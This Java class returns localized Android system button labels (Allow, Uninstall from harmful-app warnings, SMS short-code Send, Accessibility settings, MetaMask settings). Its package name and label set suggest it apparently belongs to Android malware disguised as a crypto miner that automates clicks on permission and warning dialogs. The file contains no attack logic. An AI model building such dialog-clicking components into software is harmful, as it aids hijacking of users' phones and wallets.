package com.crypto.coldMinnerPro.utils;

import org.json.JSONObject;
import java.util.Locale;

public class Stringsqw {

    public static String accept() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.accept);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Accept";
        }
    }

    public static String metamask_settings() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.metamask_settings);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Settings";
        }
    }

    public static String alert_windows_notification_turn_off_action() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.alert_windows_notification_turn_off_action);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Turn off";
        }
    }

    public static String allow() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.allow);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Allow";
        }
    }

    public static String app_info_clear_cache() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.app_info_clear_cache);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Clear cache";
        }
    }

    public static String app_info_storage() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.app_info_storage);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Storage";
        }
    }

    public static String app_info_storage2() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.app_info_storage2);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Storage";
        }
    }

    public static String cancel() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.cancel);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Cancel";
        }
    }

    public static String cancel2() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.cancel2);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Cancel";
        }
    }

    public static String clear() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.clear);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Clear";
        }
    }

    public static String clear_() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.clear_);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "clear";
        }
    }

    public static String clear_data() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.clear_data);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Clear data";
        }
    }

    public static String clear_data2() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.clear_data2);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Clear data";
        }
    }

    public static String exo_controls_pause_description() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.exo_controls_pause_description);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Pause";
        }
    }

    public static String global_action_settings() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.global_action_settings);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Settings";
        }
    }

    public static String gpsVerifYes() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.gpsVerifYes);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Yes";
        }
    }

    public static String harmful_app_warning_uninstall() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.harmful_app_warning_uninstall);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Uninstall";
        }
    }

    public static String harmful_app_warning_uninstall2() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.harmful_app_warning_uninstall2);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Uninstall";
        }
    }

    public static String localeTextAccessibility() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.l3);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Enable";
        }
    }

    public static String lockscreen_transport_pause_description() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.lockscreen_transport_pause_description);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Pause";
        }
    }

    public static String menu_setting() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.menu_setting);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Setting";
        }
    }

    public static String notification_app_name_settings() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.notification_app_name_settings);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Settings";
        }
    }

    public static String ok() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.ok);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "OK";
        }
    }

    public static String reset() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.reset);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Reset";
        }
    }

    public static String sms_short_code_confirm_allow() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.sms_short_code_confirm_allow);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Send";
        }
    }

    public static String spec_settings() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.spec_settings);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Accessibility settings";
        }
    }

    public static String spec_settings2() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.spec_settings2);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Accessibility";
        }
    }

    public static String storage_title() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.storage_title);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Storage";
        }
    }

    public static String uninstall_selected_apps() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.uninstall_selected_apps);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Clear All";
        }
    }
    
    /*
    public static String wait() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.wait);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Wait";
        }
    }
    */

    public static String yes() {
        try {
            JSONObject jsonObject = new JSONObject(Constants.yes);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        } catch (Exception ex) {
            return "Yes";
        }
    }
}